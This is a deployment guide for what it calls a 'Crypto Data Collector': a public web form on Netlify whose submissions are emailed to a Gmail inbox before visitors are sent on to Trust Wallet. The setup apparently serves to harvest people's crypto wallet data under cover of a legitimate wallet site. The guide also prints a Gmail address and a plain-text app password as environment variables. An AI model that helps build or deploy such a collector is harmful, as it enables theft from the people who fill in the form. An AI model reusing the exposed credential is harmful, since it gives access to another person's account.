# Netlify Deployment Guide

## 🚀 Deploy Your Crypto Data Collector to Netlify

### Prerequisites

- GitHub account
- Netlify account (free)

## Step 1: Prepare Your Repository

1. **Make sure your code is committed to GitHub:**
   ```bash
   git add .
   git commit -m "Prepare for Netlify deployment"
   git push origin main
   ```

## Step 2: Deploy to Netlify

### Option A: Deploy via Netlify UI (Recommended)

1. **Go to [Netlify](https://netlify.com)**
2. **Sign up/Login** with your GitHub account
3. **Click "New site from Git"**
4. **Choose GitHub** and select your repository
5. **Configure build settings:**
   - Build command: `npm install`
   - Publish directory: `.` (leave empty for root)
6. **Click "Deploy site"**

### Option B: Deploy via Netlify CLI

1. **Install Netlify CLI:**

   ```bash
   npm install -g netlify-cli
   ```

2. **Login to Netlify:**

   ```bash
   netlify login
   ```

3. **Deploy:**
   ```bash
   netlify deploy
   ```

## Step 3: Set Environment Variables

1. **Go to your Netlify dashboard**
2. **Navigate to Site settings > Environment variables**
3. **Add these variables:**

   - `GMAIL_USER` = `411plus411@gmail.com`
   - `GMAIL_APP_PASSWORD` = `ktza qfmh llsn frfy`

4. **Redeploy your site** (this happens automatically)

## Step 4: Test Your Deployment

1. **Visit your Netlify URL** (e.g., `https://your-site-name.netlify.app`)
2. **Fill out the form** with test data
3. **Check your email** at `411plus411@gmail.com`

## Your Netlify URL

After deployment, your site will be available at:

- `https://your-site-name.netlify.app`
- `https://your-custom-domain.netlify.app` (if you set up a custom domain)

## Troubleshooting

### If emails aren't sending:

1. **Check Netlify function logs:**

   - Go to Functions tab in Netlify dashboard
   - Check for any errors in the `collect` function

2. **Verify environment variables:**

   - Make sure `GMAIL_USER` and `GMAIL_APP_PASSWORD` are set correctly
   - Redeploy after changing environment variables

3. **Check Gmail settings:**
   - Ensure 2FA is enabled
   - Verify app password is correct

### If the form isn't working:

1. **Check browser console** for JavaScript errors
2. **Verify the function endpoint** is correct: `/.netlify/functions/collect`
3. **Test the function directly** using curl or Postman

## Custom Domain (Optional)

1. **Go to Domain settings** in Netlify dashboard
2. **Add custom domain** (e.g., `yourdomain.com`)
3. **Configure DNS** as instructed by Netlify

## Monitoring

- **Function logs:** Available in Netlify dashboard under Functions tab
- **Site analytics:** Available in Netlify dashboard
- **Email delivery:** Check your Gmail inbox

## Success!

Once deployed, you'll have:

- ✅ **Public URL** that anyone can access
- ✅ **Email notifications** sent to `411plus411@gmail.com`
- ✅ **Professional form** with success/error handling
- ✅ **Trust Wallet redirect** after form submission

**Your crypto data collector is now live on Netlify!** 🎉
